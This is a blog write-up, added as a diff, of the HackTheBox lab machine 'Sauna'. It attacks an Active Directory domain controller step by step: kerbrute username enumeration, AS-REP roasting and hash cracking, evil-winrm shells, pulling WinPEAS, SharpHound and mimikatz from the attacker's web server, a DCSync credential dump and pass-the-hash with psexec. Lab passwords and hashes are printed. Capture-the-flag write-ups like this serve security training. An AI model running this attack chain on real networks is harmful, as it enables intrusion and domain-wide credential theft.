@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="internet website">
+    
+    <link rel="shortcut icon" href="https://torrytw.ooo/favicon.ico">
+    
+    <link rel="stylesheet" href="/css/style.min.css">
+
+    <title>HTB - Sauna</title>
+</head>
+<body><header id="banner">
+    <h2><a href="https://torrytw.ooo">torry2</a></h2>
+    <nav>
+        <ul>
+            <li>
+                <a href="/index/" title="index">index</a>
+            </li><li>
+                <a href="/sort/" title="sort">sort</a>
+            </li><li>
+                <a href="/contact/" title="contact">contact</a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main id="content">
+<article>
+    <header id="post-header">
+        <h1>HTB - Sauna</h1>
+        <div>
+				
+                <time></time>
+            </div>
+    </header><p><img src="/htbsauna/info.png" alt="Box Info">
+Sauna | Machine <a href="https://www.hackthebox.com/home/machines/profile/229">#229</a> | Creator: <a href="https://www.hackthebox.com/home/users/profile/94858">egotisticalSW</a></p>
+<aside id="toc">
+    <h4>Table of Contents</h4>
+	<h4><a href="#enumeration">1. </a>Enumeration</h4> 
+	<h4><a href="#http-&-usersnames">2. </a>HTTP & Usernames</h4>         
+	<h4><a href="#kerbrute-users">3. </a>Kerbrute Users & AS-REP Roasting</h4>   
+	<h4><a href="#hash-cracking--ldap-dumping">5. </a>Hash Cracking & LDAP Dumping</h4>           
+	<h4><a href="#usertxt">4. </a>user.txt</h4>    
+	<h4><a href="#winpeas--pivotting">5. </a>WINPEAS & Pivotting</h4>            
+	<h4><a href="#bloodhound--domain-analysis">6. </a>BloodHound & Domain Analysis</h4>             
+	<h4><a href="#mimikatz--dcsync">7. </a>Mimikatz & DCSync</h4>
+	<h4><a href="#alternative-attack">8. </a>Alternative Attack</h4>   
+	<h4><a href="#roottxt">9. </a>root.txt</h4>            
+	<h4><a href="#conclusion">10. </a>Conclusion</h4>
+</aside>
+<p>Testing Connectivity &amp; Adding Host:
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ping -c <span class="m">1</span> 10.10.10.175 &gt; /dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">&#39;10.10.10.175 sauna.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts</span></span></code></pre></div></p>
+<h1 id="enumeration">Enumeration</h1>
+<p>A simple TCP port scan of the box with Nmap reveals it is a Windows machine and Domain Controller, also revealing the domain to be <code>EGOTISTICAL-BANK.LOCAL0</code> and interestingly running an IIS webserver.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -Pn -sC -sV 10.10.10.175
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp   open  http          Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Egotistical Bank :: Home
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2023-01-26 14:02:52Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp open  tcpwrapped
+</span></span><span class="line"><span class="cl">Service Info: Host: SAUNA<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl"><span class="p">|</span>
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 6h59m56s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   311:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2023-01-26T14:03:06
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span></code></pre></div><p>The other services running on the box appear to be standard for a Active Directory Domain Controller however give up little information without credentials, the services are still important to note as they become of value later however the webserver will be the focus of our enumeration. We still keep in mind the box is running Kerberos, LDAP and WinRM.</p>
+<h1 id="http--usernames">HTTP &amp; Usernames</h1>
+<p>When visting <code>http://sauna.htb</code> in a web browser, we are greeeted with Egotistical Banks site;
+<img src="/htbsauna/http.png" alt="HTTP Greeting">
+The site is full of filler content, anchor tags to direct us through a few seperate html pages, and contains a few forms, trying to submit the forms gives us a <code>HTTP 405</code> error or <code>&quot;HTTP verb used to access this page is not allowed.</code> <a href="https://stackoverflow.com/questions/6841139/server-error405-http-verb-used-to-access-this-page-is-not-allowed">StackOverflow</a> suggested the requests are being directed at the static html pages rather than their respective handlers, I fuzzed for file extensions on the respective pages however nothing returned. I also fuzzed for directories and subdomains however there were no interesting results. The page does not appear to hold any backend functionality.</p>
+<p>Carefully reading the <code>/about.html</code> page, It disclosed the names of a few employees of the said bank in a &ldquo;Meet The Team Panel&rdquo; which appears as below:
+<img src="/htbsauna/http2.png" alt="HTTP MeetTheTeam">
+Using this information and what we know about Active Directory domains, we can create a list of potential usernames.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat fullnames.lst
+</span></span><span class="line"><span class="cl">Fergus Smith
+</span></span><span class="line"><span class="cl">Shaun Coins
+</span></span><span class="line"><span class="cl">Sophie Driver
+</span></span><span class="line"><span class="cl">Hugo Bear
+</span></span><span class="line"><span class="cl">Bowie taylor
+</span></span><span class="line"><span class="cl">Steven Kerb
+</span></span></code></pre></div><p>To do this, I used <a href="https://github.com/urbanadventurer/username-anarchy">username-anarchy</a>, this tool is quite capable however we will only require its simple usage, it can parse a list of names and output potential usernames, it covers the common active directory formats such as firstlast and initialfirst and so on. We are given a total of 88 usernames to work with.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./username-anarchy -i fullnames.lst &gt; usernames.lst
+</span></span><span class="line"><span class="cl">cat usernames.lst
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span><span class="line"><span class="cl">taylor
+</span></span><span class="line"><span class="cl">taylor.b
+</span></span><span class="line"><span class="cl">taylor.bowie
+</span></span><span class="line"><span class="cl">bt
+</span></span><span class="line"><span class="cl">steven
+</span></span><span class="line"><span class="cl">stevenkerb
+</span></span><span class="line"><span class="cl">steven.kerb
+</span></span><span class="line"><span class="cl">stevenke
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span></code></pre></div><h1 id="kerbrute-users--as-rep-roasting">Kerbrute Users &amp; AS-REP Roasting</h1>
+<p>Since Kerberos services are running on the box, we can test if our usernames are valid users using a tool called <a href="https://github.com/ropnop/kerbrute">Kerbrute</a>, we are specifically interested in the <code>userenum</code> function. I was also recommeneded a great <a href="https://www.youtube.com/watch?v=2Xfd962QfPs&ab_channel=WEareTROOPERS">talk</a> which covered LDAP and Kerberos and what makes this tool possible.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL usernames.lst --dc 10.10.10.175
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span><span class="line"><span class="cl">2023/01/26 02:53:53 &gt;  <span class="o">[</span>+<span class="o">]</span> VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
+</span></span><span class="line"><span class="cl">2023/01/26 02:53:53 &gt;  Done! Tested <span class="m">88</span> usernames <span class="o">(</span><span class="m">1</span> valid<span class="o">)</span> in 0.568 seconds
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span></code></pre></div><p>We return 1 valid username, <code>fsmith</code>. I also checked if the same format (&lt;firstinitial&gt;&lt;last&gt;) for the other names were valid, however they were not.</p>
+<p>With a valid user on the domain, we can attempt to <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat">AS-REP Roast</a>. This attack is dependent on that <code>pre-authentication required</code> attribute. It involves and exchange between a user and Domain controller, in which the Key Distribution Center issues a Ticket Granting Ticket containing the hash of the users password. We can utilise the <a href="https://github.com/fortra/impacket">Impacket Collection</a> to do this with a script called <code>GetNPUsers.py</code>. Since we only have a singular user, the usage is quite straight forward.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">GetNPUsers.py EGOTISTICAL-BANK.LOCAL/fsmith -no-pass -dc-ip 10.10.10.175
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> fsmith
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5asrep$23$fsmith</span>@EGOTISTICAL-BANK.LOCAL:a8c07cc2ae0b91af7c392be87ec7835e<span class="nv">$d8582fca1358a07acf48e4f03d9432fb6f7398d9fc3319ab982950ef8db8e6fa5d250d148717fe6f84b7f2ac507c1c413221e158e57b3667c5c782a4360f274067f3df43fc8d487f74524cc6980f4f8d4b65acbe4c9bfc5ee5f0c1e0bbbc57aaa94a79988aaca692844704cdb37b479cb6260cc7466189e3247359c50b81f3a7e346b07c55f415ade4f8b5068f7f311609928babacf8668373aa4744eb77cbdc8de748501a1fa39ad197a25a977d46a804a630bb1fecaae2fe2d844e9719aaca55f211996aeb59dbee2edf6df438653b50f75626c1ba625db6daa6732fb1087cba7b414636277b4f1572e2d1c8841917c24047771ffcbf38a66b3f27b1bc5e9f</span>
+</span></span></code></pre></div><p>The user <code>fsmtith</code> appears to have the <code>pre-authentication required</code> flag set and we grab their password hash! We can send this to a file <code>fsmtih.kerb</code> for usability later.</p>
+<h1 id="hash-cracking--ldap-dumping">Hash Cracking &amp; LDAP Dumping</h1>
+<p>Using hashcat, we can find the mode of our specified hash and begin cracking. In this instance we will use <code>rockyou2021</code> as our wordlist.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat --example-hashes <span class="p">|</span> grep -B <span class="m">11</span> -A <span class="m">7</span> <span class="sb">`</span>head -c <span class="m">13</span> fsmith.kerb<span class="sb">`</span> <span class="p">|</span> head -n <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Hash mode <span class="c1">#18200</span>
+</span></span><span class="line"><span class="cl">hashcat -m <span class="m">18200</span> fsmith.kerb -w rockyou.txt --show
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5asrep$23$fsmith</span>@EGOTISTICAL-BANK.LOCAL:a8c07cc2ae0b91af7c392be87ec7835e<span class="nv">$d8582fca1358a07acf48e4f03d9432fb6f7398d9fc3319ab982950ef8db8e6fa5d250d148717fe6f84b7f2ac507c1c413221e158e57b3667c5c782a4360f274067f3df43fc8d487f74524cc6980f4f8d4b65acbe4c9bfc5ee5f0c1e0bbbc57aaa94a79988aaca692844704cdb37b479cb6260cc7466189e3247359c50b81f3a7e346b07c55f415ade4f8b5068f7f311609928babacf8668373aa4744eb77cbdc8de748501a1fa39ad197a25a977d46a804a630bb1fecaae2fe2d844e9719aaca55f211996aeb59dbee2edf6df438653b50f75626c1ba625db6daa6732fb1087cba7b414636277b4f1572e2d1c8841917c24047771ffcbf38a66b3f27b1bc5e9f</span>:Thestrokes23
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span></code></pre></div><p>We succesfully cracked the hash and now have a pair of credentials! <code>fsmith:Thstrokes23</code><br>
+Assuming the credentials are valid to authenticate with the domain, we can return to enumerating the other services on the box, specifically, we will take a look at LDAP and dump the domain to see if the user has any interesting attributes we can abuse. To do this, we will simply use ldapdomaindump.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapdomaindump -u EGOTISTICAL-BANK.LOCAL<span class="se">\\</span>fsmith -p <span class="s1">&#39;Thestrokes23&#39;</span> 10.10.10.175 -o ldapdump/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to host...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Binding to host
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting domain dump
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Domain dump finished
+</span></span></code></pre></div><p>In our output directory (ldapdump/), multiple html and json files are outputted for analysis.</p>
+<h1 id="usertxt">user.txt</h1>
+<p>Analysing the LDAP dump from earlier, we find that our owned user <code>fsmith</code> is apart of the <code>Remote Management Users</code> group, knowing WinRM is running on the box, we can use Evil-WinRM to get a shell.
+<img src="/htbsauna/fsmithldap.png" alt="fsmith LDAP"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>ocuments&gt;
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span></code></pre></div><p>With this interactive shell, we can see we&rsquo;eve owned <code>user.txt</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+</span></span><span class="line"><span class="cl">********************************
+</span></span></code></pre></div><h1 id="winpeas--pivotting">WINPEAS &amp; Pivotting</h1>
+<p>Before rushing to BloodHound, we can search for privledge escalation vectors locally with <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">WINPEAS</a>.
+We can serve a http server on our attacking machine to transfer the binary to the box and grab it as fsmith;</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> mkdir www <span class="o">&amp;&amp;</span> <span class="nb">cd</span> www <span class="o">&amp;&amp;</span> mv ~/opt/winpeas/winPEASany.exe winpeas.exe <span class="o">&amp;&amp;</span> python3 -m http.server <span class="m">8080</span>
+</span></span><span class="line"><span class="cl"> Serving HTTP on 0.0.0.0 port <span class="m">8080</span> <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>ocuments&gt; iwr -uri <span class="s2">&#34;http://10.10.14.x:8080/winpeas.exe&#34;</span> -outfile wp.exe
+</span></span></code></pre></div><p>We get a hit on our webserver and can confirm a copy of winpeas is on our target. Now we can simply run it from our Evil-WinRM session.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>ocuments&gt; ./wp.exe
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span><span class="line"><span class="cl">ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
+</span></span><span class="line"><span class="cl">    C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl">    C:<span class="se">\U</span>sers<span class="se">\A</span>ll Users
+</span></span><span class="line"><span class="cl">    C:<span class="se">\U</span>sers<span class="se">\D</span>efault
+</span></span><span class="line"><span class="cl">    C:<span class="se">\U</span>sers<span class="se">\D</span>efault User
+</span></span><span class="line"><span class="cl">    C:<span class="se">\U</span>sers<span class="se">\F</span>Smith : FSmith <span class="o">[</span>AllAccess<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    C:<span class="se">\U</span>sers<span class="se">\P</span>ublic
+</span></span><span class="line"><span class="cl">    C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking <span class="k">for</span> AutoLogon credentials
+</span></span><span class="line"><span class="cl">    Some AutoLogon credentials were found
+</span></span><span class="line"><span class="cl">    DefaultDomainName             :  EGOTISTICALBANK
+</span></span><span class="line"><span class="cl">    DefaultUserName               :  EGOTISTICALBANK<span class="se">\s</span>vc_loanmanager
+</span></span><span class="line"><span class="cl">    DefaultPassword               :  Moneymakestheworldgoround!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span></code></pre></div><p>WINPEAS finds some auto logon credentials of another user in the domain, interestingly, the user it finds doesnt actually exist, <code>svc_loanmanager</code> is entered as part of the autologin details, however we instead have a user <code>svc_loanmgr</code> which we can safely assume is in place, this small detail is also reflected in our LDAP domain dump and could be due to a number of reasons, nevertheless, we can attempt to get a shell as <code>svc_loanmgr</code> with these credentials as detailed by our ldap domain dump, the user is also part of the Remote Management group.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i 10.10.10.175 -u svc_loanmgr -p <span class="s1">&#39;Moneymakestheworldgoround!&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt;
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span></code></pre></div><p>These appear to be valid credentials!
+<code>svc_loanmgr:Moneymakesthewordlgoaround!</code><br>
+We have succesfully pivotted to another user.</p>
+<h1 id="bloodhound--domain-analysis">BloodHound &amp; Domain Analysis</h1>
+<p>As svc_loanmgr, we can run BloodHound and analyse the domain for privledge escalation attacks. Firstly we can grab the SharpHound powershell script from our attacking machine, run it, and use Evil-WinRm to download the output to open in BloodHound.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> ~/sauna/www <span class="o">&amp;&amp;</span> mv ~/opt/sharphound/SharpHound.ps1 sharphound.ps1 <span class="o">&amp;&amp;</span> python3 -m http.server <span class="m">8080</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8080</span> <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; iwr -uri <span class="s2">&#34;http://10.10.14.x:8080/SharpHound.ps1&#34;</span> -outfile sh.ps1
+</span></span></code></pre></div><p>With our web server hit, we can confirm its on the target and run and invoke the script setting our collection method to all.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; . ./sh.ps1
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; Invoke-BloodHound -CollectionMethod All
+</span></span></code></pre></div><p>Once its finished running, we can use Evil-WinRMs &ldquo;download&rdquo; keyword to retrieve the files to load into BloodHound.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; download 20230126093229_BloodHound.zip
+</span></span><span class="line"><span class="cl">Info: Downloading 20230126093229_BloodHound.zip to ./20230126093229_BloodHound.zip
+</span></span><span class="line"><span class="cl">Info: Download successful!
+</span></span></code></pre></div><p>After we have confirmed the file is retrieved, we can start Neo4j and Bloodhound before loading the data.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo neo4j console <span class="o">&amp;&amp;</span> sleep <span class="m">20</span> <span class="o">&amp;&amp;</span> bloodhound
+</span></span></code></pre></div><p>Once loading the data, we can query for svc_loanmgr and conduct analysis on the node. We find 1 First Degree Object Control with DCSync privledges as shown below;
+<img src="/htbsauna/bloodhound.png" alt="BloodHound">
+Notably the 2 privledges we have as svc_loanmgr are DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All .</p>
+<h1 id="mimikatz--dcsync">Mimikatz &amp; DCSync</h1>
+<p>With our analysis of the domain, we can conclude we can use the svc_loanmgr principle to perform a DCSync attack, this is detailed in BloodHounds abuse info. To perform this attack, we firstly get Mimikatz onto the box, then use lsadump to dump the Administrators secrets.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> ~/sauna/www <span class="o">&amp;&amp;</span> mv ~/opt/mimikatz/mimikatz.exe mimikatz.exe <span class="o">&amp;&amp;</span> python3 -m http.server <span class="m">8080</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8080</span> <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; iwr -uri <span class="s2">&#34;http://10.10.14.x:8080/mimikatz.exe&#34;</span> -outfile mk.exe
+</span></span></code></pre></div><p>We get a hit on our webserver and can confirm a copy of mimikatz is on our target. Now we can simply run it from our Evil-WinRM session.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; .<span class="se">\m</span>k.exe <span class="s1">&#39;lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator&#39;</span> <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Credentials:
+</span></span><span class="line"><span class="cl">  Hash NTLM: 823452073d75b9d1cf70ebdf86c7f98e
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span></code></pre></div><p>This retrieves the administrator hash!</p>
+<h1 id="alternative-attack">Alternative Attack</h1>
+<p>As we have valid credentials to the svc_loanmgr account that can perform a DCSync attack, we can also grab the administrator hashes directly with the impacket script secretsdump.py .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">secretsdump.py <span class="s1">&#39;svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span></code></pre></div><h1 id="roottxt">root.txt</h1>
+<p>To grab root.txt, we can simply use the hashes retrieved from our DCSync attack to authenticate as the Administrator. Most tools expect the full <code>LM:NT</code> hash format however Mimiktaz only gave us the second half, in this circumstance, we don&rsquo;t require the first segment of the hash to authenticate, so we can throw in some junk data. To note: Secretsdump does provide the full hash if preferred. To authenticate and get a shell, We can use another impacket script psexec.py;</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">psexec.py -hashes <span class="s1">&#39;6942012345:823452073d75b9d1cf70ebdf86c7f98e&#39;</span> -dc-ip 10.10.10.175 administrator@10.10.10.175
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+</span></span><span class="line"><span class="cl">********************************
+</span></span><span class="line"><span class="cl"><span class="o">[</span>snip<span class="o">]</span>
+</span></span></code></pre></div><p>With an interactive shell we can simply grab root.txt.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>This box demonstrated a variety of Active Directory concepts and attacks in a digestable manner, it held a realistic real-world twist on the user enumeration but kept it simple for the foothold, I found the privesc interesting and enjoyed the chance to perform a DCSync attack. Very cool!</p>
+<hr>
+<p>&ndash;&gt; Share via <a href="https://torrytw.ooo/index/htb-sauna">link</a><br>
+&ndash;&gt; Return to the <a href="https://torrytw.ooo/index/">Index</a></p>
+</article>
+
+        </main><footer id="footer">
+    Copyright © 2023 torrytwooo
+</footer>
+</body>
+</html>
